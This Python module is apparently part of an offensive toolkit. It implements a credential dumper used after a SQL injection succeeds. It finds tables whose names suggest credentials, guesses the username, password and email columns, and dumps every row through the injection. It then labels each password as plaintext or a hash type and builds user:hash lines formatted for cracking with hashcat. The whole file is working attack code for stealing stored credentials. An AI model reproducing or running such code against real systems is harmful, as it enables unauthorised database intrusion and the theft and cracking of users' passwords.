"""Post-SQLi credential dumper — targets credential tables after SQL injection is confirmed."""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..client import MCPClient
from .sqli import SqliEnumerator, SqliResult

# Common credential table name patterns
_CRED_TABLE_PATTERNS = ["user", "users", "account", "accounts", "admin", "admins",
                        "auth", "login", "member", "members", "customer", "employee",
                        "password", "credential", "creds", "staff", "person"]

# Common credential column patterns
_USER_COL_PATTERNS = ["user", "username", "email", "login", "name", "account"]
_PASS_COL_PATTERNS = ["pass", "password", "hash", "secret", "token", "pwd", "passwd"]

# MD5/SHA1/SHA256/bcrypt detection patterns
_HASH_PATTERNS = {
    "md5": r"^[a-f0-9]{32}$",
    "sha1": r"^[a-f0-9]{40}$",
    "sha256": r"^[a-f0-9]{64}$",
    "bcrypt": r"^\$2[aby]\$\d{2}\$",
    "argon2": r"^\$argon2",
    "pbkdf2": r"^pbkdf2:",
    "ntlm": r"^[a-f0-9]{32}$",  # same length as md5, noted separately
}

# Hashcat mode hints by hash type (for operator convenience).
_HASHCAT_MODES = {
    "md5": 0,
    "sha1": 100,
    "sha256": 1400,
    "bcrypt": 3200,
    "argon2": None,
    "pbkdf2": None,
    "ntlm": 1000,
}

_COMPILED_HASHES = {name: re.compile(pat, re.IGNORECASE) for name, pat in _HASH_PATTERNS.items()}


@dataclass
class CredentialEntry:
    table: str
    username: str = ""
    password_raw: str = ""
    hash_type: str = ""      # detected hash algorithm or "plaintext"
    email: str = ""
    extra: dict[str, str] = field(default_factory=dict)  # other interesting cols


@dataclass
class CredDumpResult:
    confirmed: bool = False
    credential_tables: list[str] = field(default_factory=list)
    credentials: list[CredentialEntry] = field(default_factory=list)
    hashcat_lines: list[str] = field(default_factory=list)  # user:hash format
    plaintext_lines: list[str] = field(default_factory=list)  # user:pass format
    error: str = ""


class CredDumper:
    """Wraps a confirmed SqliResult + SqliEnumerator to harvest credentials."""

    def __init__(self, client: MCPClient, sqli_result: SqliResult):
        self.client = client
        self.sqli = sqli_result
        self.enum = SqliEnumerator(client)

    # ── Heuristics ───────────────────────────────────────────────────────────────

    def _is_cred_table(self, name: str) -> bool:
        low = name.lower()
        return any(p in low for p in _CRED_TABLE_PATTERNS)

    def _detect_hash(self, value: str) -> str:
        """Return hash type string, or 'plaintext', or '' for empty/non-credential."""
        v = (value or "").strip()
        if not v:
            return ""
        # Structured hashes first (prefix-based, unambiguous).
        for name in ("bcrypt", "argon2", "pbkdf2"):
            if _COMPILED_HASHES[name].match(v):
                return name
        # Fixed-length hex hashes.
        for name in ("sha256", "sha1", "md5"):
            if _COMPILED_HASHES[name].match(v):
                return name
        return "plaintext"

    def _identify_col_roles(self, cols: list[str]) -> tuple[str, str, str]:
        """Return (user_col, pass_col, email_col); empty string if not found."""
        user_col = pass_col = email_col = ""

        # Email gets first claim on email-named columns.
        for c in cols:
            if "email" in c.lower() or "mail" in c.lower():
                email_col = c
                break

        # Password — prefer the most specific patterns first.
        for pat in _PASS_COL_PATTERNS:
            for c in cols:
                if pat in c.lower():
                    pass_col = c
                    break
            if pass_col:
                break

        # Username — skip the email column and the password column.
        for pat in _USER_COL_PATTERNS:
            for c in cols:
                cl = c.lower()
                if c in (email_col, pass_col):
                    continue
                if pat in cl:
                    user_col = c
                    break
            if user_col:
                break

        return user_col, pass_col, email_col

    # ── Column resolution ────────────────────────────────────────────────────────

    async def _get_cols_if_needed(self, table: str) -> list[str]:
        """Return columns for a table, querying via SqliEnumerator if not cached."""
        cached = self.sqli.columns.get(table)
        if cached:
            return cached
        cols = await self.enum.get_columns(
            self.sqli.template,
            self.sqli.param,
            self.sqli.column_count,
            self.sqli.string_col,
            table,
        )
        if cols:
            self.sqli.columns[table] = cols
        return cols

    # ── Main entry point ─────────────────────────────────────────────────────────

    async def run(self, extra_tables: list[str] | None = None) -> CredDumpResult:
        result = CredDumpResult()

        if not self.sqli.confirmed:
            result.error = "SqliResult is not confirmed — cannot dump credentials"
            return result
        if not self.sqli.column_count or not self.sqli.string_col:
            result.error = "SqliResult missing column_count/string_col — re-run SQLi enumeration"
            return result

        # 1. Gather candidate tables.
        all_tables = list(self.sqli.tables)
        if not all_tables:
            all_tables = await self.enum.get_tables(
                self.sqli.template,
                self.sqli.param,
                self.sqli.column_count,
                self.sqli.string_col,
            )
        for t in (extra_tables or []):
            if t not in all_tables:
                all_tables.append(t)

        cred_tables = [t for t in all_tables if self._is_cred_table(t)]
        # extra_tables are dumped even if they don't match the name heuristic.
        for t in (extra_tables or []):
            if t not in cred_tables:
                cred_tables.append(t)

        result.credential_tables = cred_tables
        if not cred_tables:
            result.error = "No credential-like tables identified"
            return result

        # 2-6. Per table: resolve columns, roles, dump, classify.
        for table in cred_tables:
            cols = await self._get_cols_if_needed(table)
            if not cols:
                continue

            user_col, pass_col, email_col = self._identify_col_roles(cols)

            rows = await self.enum.dump_table(
                self.sqli.template,
                self.sqli.param,
                self.sqli.column_count,
                self.sqli.string_col,
                table,
                cols,
            )
            if not rows:
                continue

            result.confirmed = True

            for row in rows:
                username = (row.get(user_col, "") if user_col else "").strip()
                password = (row.get(pass_col, "") if pass_col else "").strip()
                email = (row.get(email_col, "") if email_col else "").strip()

                hash_type = self._detect_hash(password) if password else ""

                extra = {
                    k: v for k, v in row.items()
                    if k not in (user_col, pass_col, email_col) and (v or "").strip()
                }

                entry = CredentialEntry(
                    table=table,
                    username=username,
                    password_raw=password,
                    hash_type=hash_type,
                    email=email,
                    extra=extra,
                )
                result.credentials.append(entry)

                # 6. Build crackable output lines.
                ident = username or email
                if not password:
                    continue
                if hash_type == "plaintext":
                    if ident:
                        result.plaintext_lines.append(f"{ident}:{password}")
                else:
                    if ident:
                        result.hashcat_lines.append(f"{ident}:{password}")
                    else:
                        result.hashcat_lines.append(password)

        if not result.confirmed:
            result.error = "Credential tables found but no rows could be dumped"

        return result
